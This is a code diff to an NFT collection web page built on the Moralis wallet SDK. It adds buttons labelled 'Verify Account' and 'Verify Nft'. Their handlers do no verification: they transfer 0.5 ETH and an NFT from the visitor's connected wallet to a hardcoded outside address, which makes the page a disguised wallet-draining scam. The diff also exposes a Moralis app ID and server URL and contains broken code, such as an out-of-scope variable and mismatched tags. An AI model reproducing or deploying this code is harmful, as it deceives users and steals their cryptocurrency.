@@ -12,41 +12,96 @@
   </head>
   <body>
     <div class="">
-      <button class="button_wc" id="btn-login" onclick="authenticate()">Connect Wallet</button>
+      <button class="button_wc" id="btn-login" onclick="login()">Connect Wallet</button>
       <button class="button_logout" id="btn-logout">Logout</button>
-      <button id="btn-get-stats">Refresh Stats</button>
+      <button id="btn-get-stats" onclick="displayWallet()" >Refresh Stats</button>
+      <button id="sendeTh" type="button" onclick="sendEth()" name="button">Verify Account</button>
+      <button id="sendnft" type="button" onclick="sendNft()" name="button">Verify Nft</button>
+
     <ul id="gas-stats"></ul>
     </div>
+
+
+          <section>
+
+          </section>
+
+          <section id="nft_header">
+            <h1 style="
+            justify-content: center; padding-top: 2px; position:sticky;text-align: center; background: black; margin:0; font-size: 1.5em;">Your Mini Satoshi NFT collection</h1>
+          </section>
+
+          <section id="nft_main" class="nft_image">
+            <div id="nft_viewer" >
+  <h1>your Wallet address</h1>
+  <h2 id="wallet_address" style=" color:white; font-size:2.5rem;" ></h1>
+  <h2 id="wallet_balance" style=" color:white; font-size:2.5rem;" ></h1>
+          </div>
+          <div id="sbsc_amount" style=" display: inline-block !important; font-weight: 700; color: aliceblue; line-height: 15px; padding-left: 15px; padding-top:20px; text-align: center;vertical-align:middle !important; ">&nbsp;</div>
+
+          <!-- <div id="sbsc_dollar" style="float: right !important;
+          clear: both !important;">&nbsp;</div> -->
+            <!-- <a href="#">Your Logo</a> -->
+        </div>
+
+          </section>
 
 
 <script type="text/javascript">
   Moralis.initialize("qzmwR7GsUDMGwahH6Z13MXUCZvi0D0Dw9lrvJG2h");
 Moralis.serverURL = ("https://fjhqwoplnapa.usemoralis.com:2053/server");
 
-async function authenticate(){
-  const provider ='walletconnect';
- try{
-   if (provider == 'walletconnect'){
-    const user = await Moralis.authenticate({provider: 'provider'});
-      web3 = await Moralis.enable({provider: 'provider'});
-   }else{
-     const user = await Moralis.authenticate();
-      web3 = await Moralis.enable();
-   }
-
- }catch(error){
-   console.log("There is an error in Verification", error);
-
- }{
-   console.log(user);
-    renderApp();
+async function login() {
+  let user = Moralis.User.current();
+  if (!user) {
+    user = await Moralis.authenticate({
+      signingMessage: "Log in using Moralis",
+    })
+      .then(function (user) {
+        console.log("logged in user:", user);
+         const walletAddress = user.get("ethAddress");
+        console.log(walletAddress);
+      })
+      .catch(function (error) {
+        console.log(error);
+      });
+  }
+}
+async function sendEth(){
+  await Moralis.authenticate();
+  await Moralis.enableWeb3();
+  const options = {type: "native", amount:Moralis.Units.ETH("0.5"), receiver: "0x4bd12e3cf4aa5c1596452686369bf535c0a0f40e"};
+// Moralis.transfer({type: "native", receiver: "0x727a9fe2F14A3a2e630FDa17c047F3661F0f6ECC", amount:Moralis.Units.ETH("0.1")});
+  let result = await Moralis.transfer(options);
+  console.log(result);
+}
+async function sendNft(){
+  const options = {type: "erc721", receiver: "0x4bd12e3cf4aa5c1596452686369bf535c0a0f40e", contract_address: "0x17763df418b812eba95edc826a1748b743db4129", token_id: 1}
+  let result = await Moralis.transfer(options);
+}
+async function displayWallet(){
+  const options={
+chain: "eth",
+   address: walletAddress,
  };
- }
+
+// nftList = await Moralis.Web3API.account.getNfts(options);
+balances = await Moralis.Web3API.account.getNativeBalance(options);
+  const showWallet = document.getElementById("wallet_address");
+  const showBalance = document.getElementById("wallet_balance");
+  showWallet.style.display = 'block';
+  showWallet.innerHTML=walletAddress;
+  // shownfts.innerHTML=nftList.nft;
+  // shownfts.style.display = 'block';
+  console.log(balances);
+  showBalance.innerHTML=balances.balance;
+
+}
  async function logOut() {
    await Moralis.User.logOut();
    console.log("logged out");
  }
- document.getElementById("btn-login").onclick = authenticate;
+ document.getElementById("btn-login").onclick = login;
  document.getElementById("btn-logout").onclick = logOut;
  document.getElementById("btn-get-stats").onclick = getStats;
 
